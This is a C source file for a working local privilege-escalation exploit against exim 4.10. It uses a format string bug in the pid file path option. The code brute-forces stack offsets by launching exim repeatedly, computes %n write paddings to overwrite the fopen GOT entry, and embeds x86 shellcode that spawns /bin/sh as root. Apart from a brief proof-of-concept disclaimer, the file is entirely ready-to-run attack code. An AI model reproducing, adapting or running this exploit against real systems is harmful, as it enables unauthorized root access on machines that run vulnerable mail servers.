/***********************************************************
 * hoagie_exim.c
 *
 * local root exploit for exim 4.10 and probably others.
 * [only works for exim admin users]
 *
 * Format string bug when handling with the pid_file_path.
 * 
 * Author: Thomas Wana <01psi194@fhwn.ac.at>
 *
 * Greetz to andi and the other hoagie-fellas :-)
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY 
 * DAMAGE DONE USING THIS PROGRAM.
 *
 ************************************************************/

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <string.h>

/*******************************************************
 * CRUCIAL VALUES
 * 
 * these standard values work for Debian Woody i386,
 * source build. 
 *
 * Play with the padding if the program can't find the
 * right stackpop values.
 *
 * ALTERNATE_PORT is the port where exim will bind during
 * the stackpop sequences. The port will be incremented by
 * one for each try, so expect to have many instances of
 * exim running. (this is because the port is bound to as
 * root and the user program can't kill that process anymore)
 *
 * Get the GOT_ADDRESS with 'objdump --dynamic-reloc exim | grep fopen'
 *
 * Shellcode-Address can vary, it is dependant on the size
 * of the current environment. I had values between 0xbffffb00
 * and 0xbffffe90. 
 *
 ********************************************************/
#define PADDING 3
#define ALTERNATE_PORT 3330
#define FOPEN_GOT_ADDRESS 0x080b6194
#define SHELLCODE_ADDRESS 0xbffffd00

#define SB4(a) ((unsigned int)(a>>24))
#define SB3(a) ((unsigned int)((a>>16)&0xFF))
#define SB2(a) ((unsigned int)((a>>8)&0xFF))
#define SB1(a) ((unsigned int)(a&0XFF))

char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                 "\xeb\x1e\x5e\x31\xc0\x88\x46\x07\x89"
                 "\x76\x08\x89\x46\x0c\x89\xc2\xb0\x0b"
                 "\x89\xf3\x8d\x4e\x08\xcd\x80\x31\xc0"
                 "\x89\xc3\x40\xcd\x80\xe8\xdd\xff\xff"
                 "\xff/bin/sh";

int port=ALTERNATE_PORT;
char path[100];

int check_for_AAAA(char *line)
{
   int rval=0;
   char *endptr;

   if(strstr(line,"too long"))
   {
      endptr=strrchr(line,':')-8;   
   }
   else
   {
      endptr=line+strlen(line)-1-8;
   }
   if(strstr(endptr,"41414141")) rval=1;
   return rval;
}

int calc_bytes_written(char *line)
{
   int rval=0;
   char *p;
   if((p=strrchr(line,':')))
   {
      rval=(p-line); 
   }
   else
   {
      rval=strlen(line);
   } 
   if(strstr(line,"pid written to ")) rval-=strlen("pid written to ");
   else rval-=strlen("failed to open pid file ");
   return rval;
}

void getstackpops(int *bigs, int *smalls, int *bytes_written)
{
   int cpid;
   int pipedes[2];
   int found=0;
   int bs=0, ss=1;
   char hilf[10];

   printf("Getting stackpops ...\n");
   *bigs=0;
   *smalls=1;

   while(!found)
   {
      if(pipe(pipedes))
      {
         perror("pipe");
         exit(1);
      }  
   
      port++;
      cpid=fork();
      if(cpid==0)
      {
         // child process
         
         char fs[10000];
         int i;
   
         // close stderr and recreate it pointing into the pipe
         close(2);
         dup2(pipedes[1],2);

         // make new formatstring

         strcpy(fs,"/tmp/%s");
         for(i=0;i<PADDING;i++)
            strcat(fs,"Z");
         strcat(fs,"0000AAAA0000AAAA0000AAAA0000AAAA");
         for(i=0;i<bs;i++)
            strcat(fs,"%+e");
         for(i=0;i<ss;i++)
            strcat(fs,"%08x");

         // execute exim
         sprintf(hilf,"%d",port);
         execl(path,"exim","-bd","-d","-oX",hilf,"-oP",fs,"-F",shellcode,NULL);
      }
      else if(cpid>0)
      {
         // parent process 
         FILE *fp=fdopen(pipedes[0],"r");
         char line[10000];
         if(fp) 
         {
            do
            {
               fgets(line,10000,fp);
               line[strlen(line)-1]=0;
   /*  printf("%s\n",line);  ENABLE THIS LINE WHEN THE PROGRAM GETS STUCK! */
               if(strstr(line,"pid written to ") ||
                  strstr(line,"failed to open pid file "))
               {
                  if(strstr(line,"nan")) printf("watch out, nan encountered.\n");
                  if(check_for_AAAA(line)==1)
                  {
                     // stackpops found, values are OK
                     found=1;
                     bs--;         // revert 2 stackpops
                     printf("Stackpops found ;-)\n");
                     *bigs=bs;
                     *smalls=ss;
                     *bytes_written=calc_bytes_written(line)-13;
                  }
                  else
                  {
                     // increase stackpops
                     ss++;
                     if(ss==3) bs++, ss=1;
                     printf("trying bs=%d, ss=%d\n",bs,ss);
                  }
               }
            } while(!strstr(line,"Listening..."));
            fclose(fp);
         }
         else perror("fdopen");
         kill(cpid,SIGINT);
         usleep(100000);
      }
      else perror("fork"); 
      close(pipedes[0]);
      close(pipedes[1]);
   }
}

void get_write_paddings(unsigned long addr, int *p1, int *p2, int *p3, 
                        int *p4, int bytes_written)
{
   // greetings to scud :-)
   int write_byte;
   int already_written;
   int padding;

   write_byte=SB1(addr);
   already_written=bytes_written;
   write_byte+=0x100;
   already_written%=0x100;
   padding=(write_byte-already_written)%0x100;
   if(padding<10) padding+=0x100;
   *p1=padding;

   write_byte=SB2(addr);
   already_written+=padding;
   write_byte+=0x100;
   already_written%=0x100;
   padding=(write_byte-already_written)%0x100;
   if(padding<10) padding+=0x100;
   *p2=padding;

   write_byte=SB3(addr);
   already_written+=padding;
   write_byte+=0x100;
   already_written%=0x100;
   padding=(write_byte-already_written)%0x100;
   if(padding<10) padding+=0x100;
   *p3=padding;

   write_byte=SB4(addr);
   already_written+=padding;
   write_byte+=0x100;
   already_written%=0x100;
   padding=(write_byte-already_written)%0x100;
   if(padding<10) padding+=0x100;
   *p4=padding;
}

int main(int argc, char **argv)
{
   int bigpops, smallpops, bytes_written, i;
   unsigned char fs[10000], hilf[1000];
   unsigned long a=FOPEN_GOT_ADDRESS,
                 b=FOPEN_GOT_ADDRESS+1,
                 c=FOPEN_GOT_ADDRESS+2,
                 d=FOPEN_GOT_ADDRESS+3; 
   unsigned int p1,p2,p3,p4;

   if(argc!=2)
   {
      printf("local root exploit for exim 4.10 [only works for exim admin users]\n\n");
      printf("./hoagie_exim path_to_exim\n\n");
      exit(1);
   }
   strcpy(path,argv[1]);        // exploiting an exploit? hehe

   getstackpops(&bigpops,&smallpops,&bytes_written);
   printf("Using %d bigpops and %d smallpops.\n", bigpops,smallpops);
   printf("Written bytes: %d\n",bytes_written);

   strcpy(fs,"/tmp/%s");
   for(i=0;i<PADDING;i++)
      strcat(fs,"Z");

   sprintf(hilf,"0000%c%c%c%c"
               "0000%c%c%c%c"
               "0000%c%c%c%c"
               "0000%c%c%c%c",
           SB1(a),SB2(a),SB3(a),SB4(a),SB1(b),SB2(b),SB3(b),SB4(b),
           SB1(c),SB2(c),SB3(c),SB4(c),SB1(d),SB2(d),SB3(d),SB4(d)); 
   strcat(fs,hilf);
   for(i=0;i<bigpops;i++)
      strcat(fs,"%+e");
   for(i=0;i<smallpops;i++)
      strcat(fs,"%08x"); 

   get_write_paddings(SHELLCODE_ADDRESS,&p1,&p2,&p3,&p4,bytes_written);

   sprintf(hilf,"%%.%uu%%n%%.%uu%%n%%.%uu%%n%%.%uu%%n",p1,p2,p3,p4);
   strcat(fs,hilf);
  
   // GET ROOT 
   printf("calling exim with fs='%s'\n",fs);
   sprintf(hilf,"%d",++port);
   execl(path,"exim","-bd","-d","-oX",hilf,"-oP",fs,"-F",shellcode,NULL);

   return 0;
}



